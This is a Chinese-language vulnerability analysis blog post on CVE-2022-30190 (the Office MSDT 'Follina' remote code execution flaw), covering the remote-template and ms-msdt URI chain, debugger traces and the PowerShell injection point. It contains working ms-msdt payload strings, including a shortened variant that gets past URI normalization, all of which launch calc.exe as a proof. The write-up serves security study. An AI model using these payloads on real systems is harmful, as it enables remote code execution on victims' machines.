@@ -1,0 +1,378 @@
+I"Tq<h1 id="前言">前言</h1>
+
+<p>在分析漏洞的过程中，陆陆续续看到许多师傅的分析文章，于是参考之后结合自己的分析总结了一下。<!--more--></p>
+
+<h1 id="漏洞简介">漏洞简介</h1>
+
+<p>近日，微软官方网站发布了Microsoft Office MSDT（Microsoft Support Diagnostic Tool）远程代码执行漏洞通告，漏洞编号CVE-2022-30190，目前在开源代码平台已存在该漏洞的验证代码。该通告指出，<strong>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可利用Office文件中的远程模板功能，访问远程服务器上挂载的恶意HTML文件，之后通过 ‘ms-msdt’ URI来执行恶意PowerShell代码</strong>。</p>
+
+<p>值得注意的是该漏洞在宏被禁用的情况下仍可被利用。<strong>并且当恶意文件另存为RTF格式时，还可以通过Windows资源管理器中的预览窗格触发此漏洞的调用，无需执行也可以在目标机器上执行任意代码。</strong>该漏洞影响范围非常广泛，目前官方未发布修复补丁。</p>
+
+<h1 id="漏洞利用链">漏洞利用链</h1>
+
+<h2 id="样本执行流程">样本执行流程</h2>
+
+<p><strong>1. 攻击者利用Office文件中的远程模板功能加载远程的poc.html</strong></p>
+
+<p>在document.xml.rels文件中可以看到docx文件嵌入了一个ole对象，指向了poc.html</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-45-45.png" alt="Snipaste_2022-06-06_11-45-45" /></p>
+
+<hr />
+
+<p><strong>2.poc.html通过 ‘ms-msdt’ URL使得Office执行msdt.exe，并将构造好的命令行参数传入msdt.exe</strong></p>
+
+<p>查看poc.html的内容，可以看到页面访问了URL：<code class="language-plaintext highlighter-rouge">ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"</code></p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-56-48.png" alt="Snipaste_2022-06-06_11-56-48" /></p>
+
+<p>上述注释是为了填充HTML页面使其大小大于4kb，只有大于4kb的HTML页面word才会解析该页面进而触发漏洞，具体原因在<a href="https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/">Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit</a>这篇文章中已经分析的很清楚了。</p>
+
+<p>使用urlprotocolview查看<strong>ms-msdt</strong> URL对应的二进制文件正是msdt.exe</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-40-32.png" alt="Snipaste_2022-06-06_11-40-32" /></p>
+
+<p>winword.exe解析该URL后会调用msdt.exe，并将命令行参数传入</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_12-44-35.png" alt="Snipaste_2022-06-06_12-44-35" /></p>
+
+<hr />
+
+<p><strong>3.msdt.exe接收命令行参数后触发漏洞执行powershell命令：<code class="language-plaintext highlighter-rouge">IEX('calc.exe')</code>，调用了calc.exe</strong></p>
+
+<p>因为直接打开msdt.exe需要输入技术支持人员密钥才能进行下一步诊断，通过参数<code class="language-plaintext highlighter-rouge">/id PCWDiagnostic</code>运行PCWDiagnostic程序兼容性诊断包绕过了该步骤</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_13-26-12.png" alt="Snipaste_2022-06-06_13-26-12" /></p>
+
+<p>然而只是绕过输入密钥还不够，还需要点击下一页，才可以接收参数执行进程，通过参数<code class="language-plaintext highlighter-rouge">/skip force </code>绕过了该步骤，此时msdt会创建并启动服务，通过svchost.exe创建进程sdiagnhost.exe</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_11-08-59.png" alt="Snipaste_2022-06-08_11-08-59" /></p>
+
+<p>接着再输入<code class="language-plaintext highlighter-rouge">/param "IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"</code>就能通过sdiagnhost.exe执行powershell命令，整个漏洞利用完成。</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-52-02.png" alt="Snipaste_2022-06-08_09-52-02" /></p>
+
+<p>整个漏洞利用链如图所示：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220815170312333.png" alt="image-20220815170312333" /></p>
+
+<h2 id="漏洞利用细节">漏洞利用细节</h2>
+
+<h3 id="word解析url">word解析URL</h3>
+
+<p>word在解析ms-msdt Office URL时是通过mshtml.dll的ShellExecURL函数解析的，而该函数内部会调用ShellExecuteW执行命令行参数创建msdt.exe</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
+rax=0000000000000000 rbx=0000000000000000 rcx=0000000000000000
+rdx=0000000000000000 rsi=0000000080004005 rdi=00000267dfbe07f0
+rip=00007ffa2fe2fe45 rsp=000000f644b0d410 rbp=000000f644b0d510
+ r8=00000267dfb84838  r9=0000000000000000 r10=0000000000000000
+r11=0000000000000246 r12=00007ffa3086e358 r13=0000000000000000
+r14=0000000000000000 r15=0000000000000020
+iopl=0         nv up ei pl zr na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+mshtml!ShellExecURL+0x24d:
+00007ffa`2fe2fe45 48ff1554b8c600  call    qword ptr [mshtml!_imp_ShellExecuteW (00007ffa`30a9b6a0)] ds:00007ffa`30a9b6a0={mshtml!_imp_load_ShellExecuteW (00007ffa`2f8edaaa)}
+0:000&gt; du r8		//ShellExecuteW的执行参数
+00000267`dfb84838  "ms-msdt:/id PCWDiagnostic /skip "
+00000267`dfb84878  "force /param "IT_RebrowseForFile"
+00000267`dfb848b8  "=cal?c IT_SelectProgram=NotListe"
+00000267`dfb848f8  "d IT_BrowseForFile=h$(IEX('calc."
+00000267`dfb84938  "exe'))i/../../../../../../../../"
+00000267`dfb84978  "../../../../../../Windows/System"
+00000267`dfb849b8  "32/mpsigstub.exe ""
+0:000&gt; k			//函数调用栈
+ # Child-SP          RetAddr           Call Site
+00 00000092`064fccc8 00007ffa`707502de SHELL32!ShellExecuteNormal
+01 00000092`064fccd0 00007ffa`707d8f11 SHELL32!ShellExecuteExW+0xde
+02 00000092`064fce70 00007ffa`2fe2fe4c SHELL32!ShellExecuteW+0x81
+03 00000092`064fcf30 00007ffa`2fe2ee3a mshtml!ShellExecURL+0x254
+04 00000092`064fd1f0 00007ffa`2fb4e721 mshtml!OpenInNewWindow+0x38e
+05 00000092`064fd3e0 00007ffa`2f6206cf mshtml!CDoc::DoNavigate_NavigateInNewBrowser+0x201
+06 00000092`064fd470 00007ffa`2f619f00 mshtml!CDoc::DoNavigate+0xbaf
+07 00000092`064fd7c0 00007ffa`2f751420 mshtml!CDoc::FollowHyperlink2+0xc70
+08 00000092`064fd9c0 00007ffa`2f75072b mshtml!CWindow::FollowHyperlinkHelper+0x2a4
+09 00000092`064fdb40 00007ffa`2f74a704 mshtml!CWindow::NavigateEx+0xeb
+0a 00000092`064fdcb0 000001c0`4fad4802 mshtml!COmLocationProxy::InvokeEx+0x4f4
+0b 00000092`064fddc0 000001c0`4fad468e jscript9!HostDispatch::CallInvokeExInternal+0xf2
+0c 00000092`064fde60 000001c0`4fad4540 jscript9!HostDispatch::CallInvokeHandler+0x96
+0d 00000092`064fdee0 000001c0`4fb8afb6 jscript9!HostDispatch::CallInvokeEx+0x90
+0e 00000092`064fdf70 000001c0`4fb8aed3 jscript9!HostDispatch::PutValueByDispId+0xd6
+0f 00000092`064fe030 000001c0`4fa50ce1 jscript9!HostDispatch::PutValue+0x37
+10 00000092`064fe070 000001c0`4fa54a1e jscript9!Js::JavascriptOperators::OP_SetProperty+0x1d1
+11 00000092`064fe100 000001c0`4fa43f43 jscript9!Js::JavascriptOperators::PatchPutValueNoFastPath+0x7e
+12 00000092`064fe180 000001c0`4fa47a2d jscript9!Js::InterpreterStackFrame::DoProfiledSetProperty&lt;Js::OpLayoutElementCP_OneByte const &gt;+0x183
+13 00000092`064fe240 000001c0`4fa45029 jscript9!Js::InterpreterStackFrame::Process+0x6cd
+14 00000092`064fe2c0 000001c0`4ff00fc3 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x4c9
+15 00000092`064fe4d0 000001c0`4fb0afb6 0x000001c0`4ff00fc3
+16 00000092`064fe500 000001c0`4f9eb3d1 jscript9!amd64_CallFunction+0x86
+17 00000092`064fe550 000001c0`4fa9abc9 jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x71
+18 00000092`064fe5c0 000001c0`4fa9aab0 jscript9!Js::JavascriptFunction::CallRootFunctionInternal+0xfd
+19 00000092`064fe690 000001c0`4fa9aa0b jscript9!Js::JavascriptFunction::CallRootFunction+0x64
+1a 00000092`064fe700 000001c0`4fa9a929 jscript9!ScriptSite::CallRootFunction+0x67
+1b 00000092`064fe760 000001c0`4fa9ae80 jscript9!ScriptSite::Execute+0x109
+1c 00000092`064fe7f0 000001c0`4fa20430 jscript9!ScriptEngine::ExecutePendingScripts+0x234
+1d 00000092`064fe8e0 000001c0`4faf6924 jscript9!ScriptEngine::ParseScriptTextCore+0x49c
+1e 00000092`064fea40 00007ffa`2f81e0c8 jscript9!ScriptEngine::ParseScriptText+0xc4
+1f 00000092`064feaf0 00007ffa`2f5a25aa mshtml!CActiveScriptHolder::ParseScriptText+0xb8
+20 00000092`064feb70 00007ffa`2f5a0f92 mshtml!CScriptCollection::ParseScriptText+0x25a
+21 00000092`064fec50 00007ffa`2f5a09b6 mshtml!CScriptData::CommitCode+0x422
+22 00000092`064fee20 00007ffa`2f5a072f mshtml!CScriptData::Execute+0x266
+23 00000092`064feed0 00007ffa`2f63fa05 mshtml!CHtmScriptParseCtx::Execute+0xbf
+24 00000092`064fef00 00007ffa`2f540767 mshtml!CHtmParseBase::Execute+0x95
+25 00000092`064fef90 00007ffa`2f53ffaa mshtml!CHtmPost::Broadcast+0x47
+26 00000092`064fefd0 00007ffa`2f80db06 mshtml!CHtmPost::Exec+0x29a
+27 00000092`064ff1d0 00007ffa`2f80d9db mshtml!CHtmPost::Run+0x32
+28 00000092`064ff200 00007ffa`2f80d96f mshtml!PostManExecute+0x63
+29 00000092`064ff240 00007ffa`2f80d4d0 mshtml!PostManResume+0xab
+2a 00000092`064ff280 00007ffa`2f875eec mshtml!CHtmPost::OnDwnChanCallback+0x40
+2b 00000092`064ff2d0 00007ffa`2f53b0c1 mshtml!CDwnChan::OnMethodCall+0x1c
+2c 00000092`064ff300 00007ffa`2f5dca04 mshtml!GlobalWndOnMethodCall+0x2b1
+2d 00000092`064ff3b0 00007ffa`2f9854b8 mshtml!GlobalWndProc_SEH+0x104
+2e 00000092`064ff440 00007ffa`6fd1e858 mshtml!GlobalWndProc+0x3a8c08
+2f 00000092`064ff480 00007ffa`6fd1e299 USER32!UserCallWinProcCheckWow+0x2f8
+30 00000092`064ff610 00007ffa`3e081af9 USER32!DispatchMessageWorker+0x249
+31 00000092`064ff690 00007ffa`3dfe2009 wwlib!PTLS7::LsNotReached+0x7bd49
+32 00000092`064ff730 00007ff6`79e71230 wwlib!FMain+0x61
+33 00000092`064ff760 00007ff6`79e71519 winword+0x1230
+34 00000092`064ff790 00007ffa`71177034 winword+0x1519
+35 00000092`064ff7d0 00007ffa`71362651 KERNEL32!BaseThreadInitThunk+0x14
+36 00000092`064ff800 00000000`00000000 ntdll!RtlUserThreadStart+0x21
+</code></pre></div></div>
+
+<p>ShellExecuteW内部则是通过CreateRemoteThreadEx创建新线程，通过新线程创建msdt.exe：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:027&gt; r
+rax=0000000002000000 rbx=0000000000000000 rcx=000000e48ad4d438
+rdx=000000e48ad4d4a0 rsi=0000021054c22ee0 rdi=0000000000000000
+rip=00007ffada60e620 rsp=000000e48ad4d358 rbp=000000e48ad4eb00
+ r8=0000000002000000  r9=0000000002000000 r10=0000000000000000
+r11=000000e48ad4d300 r12=0000000000000001 r13=0000000000000002
+r14=0000000000000008 r15=0000000000000000
+iopl=0         nv up ei pl zr na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+ntdll!NtCreateUserProcess:
+00007ffa`da60e620 4c8bd1          mov     r10,rcx
+0:027&gt; dps poi(esp+98) La8/8			//AttributeList
+000000e4`8ad4df00  00000000`000000a8
+000000e4`8ad4df08  00000000`00020005	//PS_ATTRIBUTE_IMAGE_NAME
+000000e4`8ad4df10  00000000`00000040	//NtImagePath.Length
+000000e4`8ad4df18  00000210`54bae7b0	//NtImagePath.Buffer
+000000e4`8ad4df20  00000000`00000000
+000000e4`8ad4df28  00000000`00010003
+000000e4`8ad4df30  00000000`00000010
+000000e4`8ad4df38  000000e4`8ad4d7c0
+000000e4`8ad4df40  00000000`00000000
+000000e4`8ad4df48  00000000`00000006
+000000e4`8ad4df50  00000000`00000040
+000000e4`8ad4df58  000000e4`8ad4d900
+000000e4`8ad4df60  00000000`00000000
+000000e4`8ad4df68  00000000`00020009
+000000e4`8ad4df70  00000000`00000004
+000000e4`8ad4df78  000000e4`8ad4d6f0
+000000e4`8ad4df80  00000000`00000000
+000000e4`8ad4df88  00000000`0006001a
+000000e4`8ad4df90  00000000`00000001
+000000e4`8ad4df98  00000000`00000001
+000000e4`8ad4dfa0  00000000`00000000
+0:027&gt; du 00000210`54bae7b0				//创建的进程名
+00000210`54bae7b0  "\??\C:\Windows\system32\msdt.exe"
+00000210`54bae7f0  ""
+0:027&gt; k								//创建msdt.exe的线程调用栈
+ # Child-SP          RetAddr           Call Site
+00 000000e4`8ad4d358 00007ffa`d8128e73 ntdll!NtCreateUserProcess
+01 000000e4`8ad4d360 00007ffa`d81271a6 KERNELBASE!CreateProcessInternalW+0xfe3
+02 000000e4`8ad4e930 00007ffa`d89dcbb4 KERNELBASE!CreateProcessW+0x66
+03 000000e4`8ad4e9a0 00007ffa`d5f1152d KERNEL32!CreateProcessWStub+0x54
+04 000000e4`8ad4ea00 00007ffa`d5ea6722 windows_storage!CInvokeCreateProcessVerb::CallCreateProcess+0x2cd
+05 000000e4`8ad4ecb0 00007ffa`d5f0a75c windows_storage!CInvokeCreateProcessVerb::_PrepareAndCallCreateProcess+0x2d6
+06 000000e4`8ad4ed30 00007ffa`d5f0a583 windows_storage!CInvokeCreateProcessVerb::_TryCreateProcess+0x3c
+07 000000e4`8ad4ed60 00007ffa`d5f0a46d windows_storage!CInvokeCreateProcessVerb::Launch+0xef
+08 000000e4`8ad4ee00 00007ffa`d5f49dc4 windows_storage!CInvokeCreateProcessVerb::Execute+0x5d
+09 000000e4`8ad4ee40 00007ffa`d5e31d87 windows_storage!CBindAndInvokeStaticVerb::InitAndCallExecute+0x214
+0a 000000e4`8ad4eec0 00007ffa`d5ea5787 windows_storage!CBindAndInvokeStaticVerb::TryCreateProcessDdeHandler+0x63
+0b 000000e4`8ad4ef40 00007ffa`d5ef586d windows_storage!CBindAndInvokeStaticVerb::Execute+0x1e7
+0c 000000e4`8ad4f260 00007ffa`d5ef5785 windows_storage!RegDataDrivenCommand::_TryInvokeAssociation+0xad
+0d 000000e4`8ad4f2c0 00007ffa`d9b92b22 windows_storage!RegDataDrivenCommand::_Invoke+0x141
+0e 000000e4`8ad4f330 00007ffa`d9b929da SHELL32!CRegistryVerbsContextMenu::_Execute+0xce
+0f 000000e4`8ad4f3a0 00007ffa`d9b9630c SHELL32!CRegistryVerbsContextMenu::InvokeCommand+0xaa
+10 000000e4`8ad4f6a0 00007ffa`d9b9618d SHELL32!HDXA_LetHandlerProcessCommandEx+0x10c
+11 000000e4`8ad4f7b0 00007ffa`d9b926ab SHELL32!CDefFolderMenu::InvokeCommand+0x13d
+12 000000e4`8ad4fb10 00007ffa`d9b92583 SHELL32!CShellExecute::_InvokeInProcExec+0xfb
+13 000000e4`8ad4fc10 00007ffa`d9bcd671 SHELL32!CShellExecute::_InvokeCtxMenu+0x5b
+14 000000e4`8ad4fc50 00007ffa`d9bac32d SHELL32!CShellExecute::_DoExecute+0x151
+15 000000e4`8ad4fcc0 00007ffa`da48c3f9 SHELL32!&lt;lambda_519a2c088cd7d0cdfafe5aad47e70646&gt;::&lt;lambda_invoker_cdecl&gt;+0x2d
+16 000000e4`8ad4fd30 00007ffa`d89d7034 SHCORE!_WrapperThreadProc+0xe9
+17 000000e4`8ad4fe10 00007ffa`da5c2651 KERNEL32!BaseThreadInitThunk+0x14
+18 000000e4`8ad4fe40 00000000`00000000 ntdll!RtlUserThreadStart+0x21
+</code></pre></div></div>
+
+<p>分析word解析URL是因为在尝试缩减payload的过程中发现了缩减后的payload能在cmd上成功执行命令，但是内嵌到docx文档中则无法执行，于是探索了一番。</p>
+
+<h3 id="一些尝试">一些尝试</h3>
+
+<p>原本的payload可以直接在cmd上运行，其中有些参数是不必要的，最终缩减的payload为<code class="language-plaintext highlighter-rouge">msdt /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"</code>，将payload替换到poc.html中<code class="language-plaintext highlighter-rouge">window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../../$(calc).exe \" ";</code>。然而该payload却无法在word中执行成功，procmon抓到的参数是不完整的：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-53-02.png" alt="Snipaste_2022-06-08_09-53-02" /></p>
+
+<p>重新调试word，断在ShellExecURL，发现到该函数时命令行的参数已经变成<code class="language-plaintext highlighter-rouge">ms-msdt:/id PCWDiagnostic /$(calc).exe</code>：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
+rax=0000000000000000 rbx=0000000000000000 rcx=000002c0dc60fc00
+rdx=000002c0cdec0000 rsi=000002c8e5144200 rdi=000002c8e5190400
+rip=00007ffa9737fbf8 rsp=000000fbbf39d748 rbp=000000fbbf39d850
+ r8=000002c0cde50d20  r9=0000000000000001 r10=0000000000008000
+r11=000000fbbf39d5a0 r12=00007ffa97dbe358 r13=0000000000000000
+r14=0000000000000000 r15=000002c0df5435d0
+iopl=0         nv up ei pl zr na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+mshtml!ShellExecURL:
+00007ffa`9737fbf8 488bc4          mov     rax,rsp
+0:000&gt; du 000002c0df5438a0 
+000002c0`df5438a0  "/id PCWDiagnostic /$(calc).exe""
+</code></pre></div></div>
+
+<p>向前回溯在执行函数<code class="language-plaintext highlighter-rouge">iertutil!CreateUri</code>后，传入的参数被截断：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
+rax=00000000000000dc rbx=000000000000006e rcx=000000b3c48fbe10
+rdx=0000000003002b85 rsi=000001f1917fe9a8 rdi=0000000000000000
+rip=00007ffa96d34a77 rsp=000000b3c48fbdb0 rbp=000000b3c48fbeb0
+ r8=0000000000000000  r9=000000b3c48fbde8 r10=0000000000000000
+r11=000000000000006e r12=000000b3c48fdeb0 r13=0000000000000000
+r14=000000b3c48fdec8 r15=000000000000006e
+iopl=0         nv up ei pl zr na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+mshtml!GetFullyExpandedUri+0x12b:
+00007ffa`96d34a77 48ff1572c7f600  call    qword ptr [mshtml!_imp_CreateUri (00007ffa`97ca11f0)] ds:00007ffa`97ca11f0={iertutil!CreateUri (00007ffa`ce4ffa10)}
+0:000&gt; du rcx											//传入的参数
+000000b3`c48fbe10  "ms-msdt:/id PCWDiagnostic /skip "
+000000b3`c48fbe50  "force /param "IT_LaunchMethod=Co"
+000000b3`c48fbe90  "ntextMenu IT_BrowseForFile=/../."
+000000b3`c48fbed0  "./$(calc).exe""
+0:000&gt; dps r9 L1										//传出的IUri结构指针
+000000b3`c48fbde8  00000000`00000000
+0:000&gt; p
+mshtml!GetFullyExpandedUri+0x132:
+00007ffa`96d34a7e 0f1f440000      nop     dword ptr [rax+rax]
+0:000&gt; du poi(poi(000000b3`c48fbde8)+68)				//执行完函数后返回的IUri结构所指的URI字符串
+000001f1`8a2bc560  "/id PCWDiagnostic /$(calc).exe""
+</code></pre></div></div>
+
+<p>此时查看MSDN对于<a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775098(v=vs.85)">CreateUri</a>函数的说明，发现对于传入的URI会进行规范化，会删除相对路径段”./”和”../”，并酌情缩短路径，因此原本的参数会被截断。</p>
+
+<p>但是原payload中的”./”和”../”被保留下来了，分析后得知在如果参数中有”?”符号，则后面的内容不会被截断，于是重新编写payload<code class="language-plaintext highlighter-rouge">window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_ReBrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"";</code>能成功执行：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-53-33.png" alt="Snipaste_2022-06-08_09-53-33" /></p>
+
+<h1 id="漏洞原理分析">漏洞原理分析</h1>
+
+<h2 id="windows-troubleshooting-platformwtp简介">Windows Troubleshooting Platform（WTP）简介</h2>
+
+<h3 id="wtp架构">WTP架构</h3>
+
+<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/wintt/about-wtp">WTP</a>由一个 Windows 故障排除运行引擎、结果报告和调试报告、四个故障排除 cmdlet 和一个托管的 Windows PowerShell 运行环境组成，不同的Windows故障排除包会调用不同PowerShell Script，并输出对应的结果报告和调试报告。下图显示了 WTP 架构：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/architecture.png" alt="architecture" /></p>
+
+<p>Windwos故障排除包既可以通过WTP 向导 (MSDT.exe) 运行（本次漏洞就是通过这种方式），又可以在Windows PowerShell 窗口中运行，通过Windows PowerShell 窗口运行故障排除包时msdt.exe不会启动：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_11-15-57.png" alt="Snipaste_2022-06-08_11-15-57" /></p>
+
+<h3 id="故障排除包troubleshooting-pack的组件">故障排除包（Troubleshooting Pack）的组件</h3>
+
+<p>下图显示了故障排除包中包含的组件：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/manifest.png" alt="manifest" /></p>
+
+<p>故障排除包的设计基于三个步骤或阶段：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verification）。每个阶段都表示为一组 Windows PowerShell 脚本，对应脚本的开头分别为<strong>TS</strong>，<strong>RS</strong>和<strong>VF</strong>。本次漏洞中使用的PCWDiagnostic程序兼容性诊断包就正好有三个对应阶段的不同脚本：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_14-25-03.png" alt="Snipaste_2022-06-08_14-25-03" /></p>
+
+<p>当用户调用PCWDiagnostic程序兼容性诊断包时，WTP 会实例化一个 Windows PowerShell 运行空间来运行脚本，由于对于参数没有正确的过滤导致在执行脚本时会将参数中的”$”解析，导致了代码注入。</p>
+
+<h2 id="调试sdiagnhostexe">调试sdiagnhost.exe</h2>
+
+<p>使用dnSpy调试sdiagnhost.exe，可以利用windbg的工具gflags.exe设置sdiagnhost.exe的debuger为dnSpy.exe：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-44-25.png" alt="Snipaste_2022-06-08_16-44-25" /></p>
+
+<p>执行在命令行执行payload后，sdiagnhost.exe创建后会被dnSpy调试，此时下断在<code class="language-plaintext highlighter-rouge">Microsoft.Windows.Diagnosis.ManagedHost.RunScript() </code>方法，随后启动调试会断在RunScript方法内：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-52-56.png" alt="Snipaste_2022-06-08_16-52-56" /></p>
+
+<p>可以看到待执行的PowerShell指令text中的内容就是scriptPath，随后到达第二个断点。此时text的内容依然是scriptPath，将要执行脚本<code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code></p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-59-16.png" alt="Snipaste_2022-06-08_16-59-16" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code>脚本获取msdt参数中IT_BrowseForFile部分的内容并调用<code class="language-plaintext highlighter-rouge">Test-Selection</code>方法检查参数是否符合要求：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_18-53-51.png" alt="Snipaste_2022-06-08_18-53-51" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Test-Selection</code>首先检查了IT_BrowseForFile传入的路径是否存在，接着检查路径后缀名是否为.exe或.msi，符合这两个条件表示路径合法</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-00-08.png" alt="Snipaste_2022-06-08_19-00-08" /></p>
+
+<p>尽管/../../已经超出了C:/的根路径，但是<code class="language-plaintext highlighter-rouge">test-path</code>方法返回的结果仍然为True，因此路径被判定合法：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-05-10.png" alt="Snipaste_2022-06-08_19-05-10" /></p>
+
+<p>随后通过<code class="language-plaintext highlighter-rouge">$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")</code>来过滤传入的路径，测试了appname的过滤效果，发现执行了过滤语句后$(calc)仍然存在</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-34-34.png" alt="Snipaste_2022-06-08_19-34-34" /></p>
+
+<p>最终调用Update-DiagRootCause方法，且传入TARGETPATH和APPNAME：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-33-46.png" alt="Snipaste_2022-06-08_19-33-46" /></p>
+
+<p>在dnSpy下断于<code class="language-plaintext highlighter-rouge">Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootCause.ProcessRecord()</code>方法，点击运行后成功断下：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-52-44.png" alt="Snipaste_2022-06-08_19-52-44" /></p>
+
+<p>继续向下调试，调用了<code class="language-plaintext highlighter-rouge">scriptedDiagnosticInteraction.RecordRootcause</code>，且将APPNAME和TARGETPATH作为参数传入：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-55-45.png" alt="Snipaste_2022-06-08_19-55-45" /></p>
+
+<p>继续运行，发现停在了<code class="language-plaintext highlighter-rouge">RunScript</code>方法，且参数正是APPNAME和TARGETPATH，说明通过调用<code class="language-plaintext highlighter-rouge">scriptedDiagnosticInteraction.RecordRootcause</code>方法执行了脚本<code class="language-plaintext highlighter-rouge">RS_ProgramCompatibilityWizard.ps1</code>，并且将参数APPNAME和TARGETPATH传入到脚本中：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-57-35.png" alt="Snipaste_2022-06-08_19-57-35" /></p>
+
+<p>脚本接收两个参数，并赋给变量$targetPath和$appName，检查$targetPath是否为可执行文件：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-10-50.png" alt="Snipaste_2022-06-08_20-10-50" /></p>
+
+<p>随后分别将$targetPath和$appName当作命令行参数赋给$getDiagCmd，此时命令行中会有注入的代码<code class="language-plaintext highlighter-rouge">$(calc)</code>：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-42-34.png" alt="Snipaste_2022-06-08_20-42-34" /></p>
+
+<p>最终执行命令行，触发代码注入：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-43-30.png" alt="Snipaste_2022-06-08_20-43-30" /></p>
+
+<p>由于在命令行中既有$targetPath，又有$appName，猜想在执行命令时应该会执行两次calc：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-09_11-07-25.png" alt="Snipaste_2022-06-09_11-07-25" /></p>
+
+<p>查看procmon的日志，确实发现sdiagnhost.exe创建了calc.exe两次，验证了猜想：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-09_11-09-56.png" alt="Snipaste_2022-06-09_11-09-56" /></p>
+
+<h1 id="总结">总结</h1>
+
